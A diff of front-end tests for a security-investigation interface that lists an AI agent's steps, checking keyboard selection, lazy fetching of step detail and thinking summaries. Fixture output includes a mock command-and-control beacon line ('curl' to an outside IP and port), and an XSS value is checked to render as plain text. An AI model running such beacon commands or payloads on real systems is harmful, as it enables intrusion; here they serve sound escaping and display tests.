@@ -187,63 +187,95 @@ test("agent steps are a timeline list with the totals first", async () => {
   renderAt("/cases/41");
   const steps = await screen.findByRole("region", { name: "Agent steps" });
   await userEvent.click(steps.querySelector("summary.steps-total")!);
-  const items = within(steps).getAllByRole("listitem");
-  expect(items).toHaveLength(3);                                       // plan, tool, verdict
-  expect(items[1]).toHaveTextContent("edr.process_tree");
+  const items = within(steps).getAllByRole("option");
+  expect(items).toHaveLength(4);                                       // request, plan, tool, verdict
+  expect(items[0]).toHaveTextContent("Request");
+  expect(items[1]).toHaveTextContent("Model");
+  expect(items[1]).not.toHaveTextContent(/model\s*·\s*model/i);       // the kind is not repeated after the name
+  expect(items[2]).toHaveTextContent("edr.process_tree");
+  expect(items[2]).toHaveTextContent("0.12 s");                        // time on the name line
   const total = steps.querySelector(".steps-total")!;
-  expect(total).toHaveTextContent("3 steps (2 model, 1 tool)");
+  expect(total).toHaveTextContent("3 steps (2 model, 1 tool)");        // the request is not counted as a step
   expect(total).toHaveTextContent("6,030");                            // tokens in + out
   expect(total).toHaveTextContent("4.37 s");
   expect(before(total, items[0])).toBe(true);
 });
 
-// ----- a step's details: fetched when opened, not with the list -----
-async function openStepDetails(index: number) {
+// ----- the steps: a list on the left, the selected step's detail on the right -----
+async function openSteps() {
   const steps = await screen.findByRole("region", { name: "Agent steps" });
   if (!(steps.querySelector("details.steps-box") as HTMLDetailsElement).open) {
     await userEvent.click(steps.querySelector("summary.steps-total")!);
   }
-  const item = within(steps).getAllByRole("listitem")[index];
-  await userEvent.click(within(item).getByText("Details"));
-  return item;
+  return { list: within(steps).getByRole("listbox", { name: "Steps" }), pane: within(steps).getByRole("region", { name: "Step detail" }) };
 }
 
-test("a tool step's input and output are fetched only when its details are opened", async () => {
+async function select(index: number) {
+  const { list, pane } = await openSteps();
+  await userEvent.click(within(list).getAllByRole("option")[index]);
+  return pane;
+}
+
+test("the request is selected first and only the shown step is fetched, once the steps are opened", async () => {
   const fetched: string[] = [];
   server.events.on("request:start", ({ request }) => {
     if (request.url.includes("/steps/")) fetched.push(new URL(request.url).pathname);
   });
   renderAt("/cases/41");
-  const steps = await screen.findByRole("region", { name: "Agent steps" });
-  await userEvent.click(steps.querySelector("summary.steps-total")!);
-  expect(fetched).toEqual([]);                                         // the list alone fetches no step
+  await screen.findByRole("region", { name: "Agent steps" });
+  expect(fetched).toEqual([]);                                         // nothing while the steps are closed
 
-  const item = await openStepDetails(1);
-  expect(await within(item).findByRole("heading", { name: "Output" })).toBeVisible();
-  expect(item).toHaveTextContent('"pid": 4312');                       // input
-  expect(item).toHaveTextContent("curl -s http://203.0.113.50:8443/beacon");  // output
-  expect(item).toHaveTextContent(XSS);                                 // vendor data shown as text
-  expect(item.querySelector("img")).toBeNull();
-  expect(fetched).toEqual(["/api/investigations/aaaaaaaa-0000-0000-0000-000000000041/steps/1"]);
+  const { list, pane } = await openSteps();
+  expect(within(list).getAllByRole("option")[0]).toHaveAttribute("aria-selected", "true");
+  expect(within(pane).getByRole("heading", { name: "Request" })).toBeVisible();
+  await within(pane).findByText(`Case 41: 3 alert(s) on host(s) web-srv-01. ${XSS}`);  // shown as text
+  expect(pane.querySelector("img")).toBeNull();
+  expect(fetched).toEqual(["/api/investigations/aaaaaaaa-0000-0000-0000-000000000041/steps/0"]);
   server.events.removeAllListeners();
 });
 
-test("a model step shows its message, or says it only called tools", async () => {
+test("Up and Down move the selection, and the detail follows it", async () => {
   renderAt("/cases/41");
-  const verdict = await openStepDetails(2);
-  expect(await within(verdict).findByText("Beaconing confirmed; submitting.")).toBeVisible();
+  const { list, pane } = await openSteps();
+  list.focus();
 
-  const plan = await openStepDetails(0);
-  expect(await within(plan).findByText("No message: the model only called tools.")).toBeVisible();
+  await userEvent.keyboard("{ArrowDown}{ArrowDown}");                  // request -> plan -> tool
+  const options = within(list).getAllByRole("option");
+  expect(options[2]).toHaveAttribute("aria-selected", "true");
+  expect(options[0]).toHaveAttribute("aria-selected", "false");
+  expect(list).toHaveAttribute("aria-activedescendant", options[2].id);
+  await within(pane).findByRole("heading", { name: "Output" });
+  expect(pane).toHaveTextContent('"pid": 4312');                       // input
+  expect(pane).toHaveTextContent("curl -s http://203.0.113.50:8443/beacon");  // output
+  expect(pane.querySelector("img")).toBeNull();                        // vendor data shown as text
+
+  await userEvent.keyboard("{ArrowUp}{ArrowUp}{ArrowUp}");             // stops at the first step
+  expect(options[0]).toHaveAttribute("aria-selected", "true");
+  await userEvent.keyboard("{End}");
+  expect(options[3]).toHaveAttribute("aria-selected", "true");
+});
+
+test("a model step shows its thinking summary above its message, only when it has one", async () => {
+  renderAt("/cases/41");
+  const plan = await select(1);
+  const thinking = await within(plan).findByRole("heading", { name: "Thinking summary" });
+  expect(plan).toHaveTextContent("The alert is on web-srv-01; start with its process tree.");
+  expect(before(thinking, within(plan).getByRole("heading", { name: "Message" }))).toBe(true);
+  expect(plan).toHaveTextContent("No message: the model only called tools.");
+
+  const verdict = await select(3);
+  await within(verdict).findByText("Beaconing confirmed; submitting.");
+  expect(within(verdict).queryByRole("heading", { name: "Thinking summary" })).toBeNull();
 });
 
 test("a tool step from a run saved before outputs were kept says so", async () => {
   server.use(http.get(api("/investigations/:id/steps/:index"), () =>
-    HttpResponse.json({ investigation_id: "aaaaaaaa-0000-0000-0000-000000000041", index: 1, kind: "tool",
-                        name: "edr.process_tree", text: null, args: { host: "web-srv-01" }, result: null, error: null })));
+    HttpResponse.json({ investigation_id: "aaaaaaaa-0000-0000-0000-000000000041", index: 2, kind: "tool",
+                        name: "edr.process_tree", text: null, thought: null, args: { host: "web-srv-01" }, result: null,
+                        error: null })));
   renderAt("/cases/41");
-  const item = await openStepDetails(1);
-  expect(await within(item).findByText("Not recorded: this run was saved before tool outputs were kept.")).toBeVisible();
+  const pane = await select(2);
+  expect(await within(pane).findByText("Not recorded: this run was saved before tool outputs were kept.")).toBeVisible();
 });
 
 // ----- investigation cards: the latest run and earlier ones, newest first -----
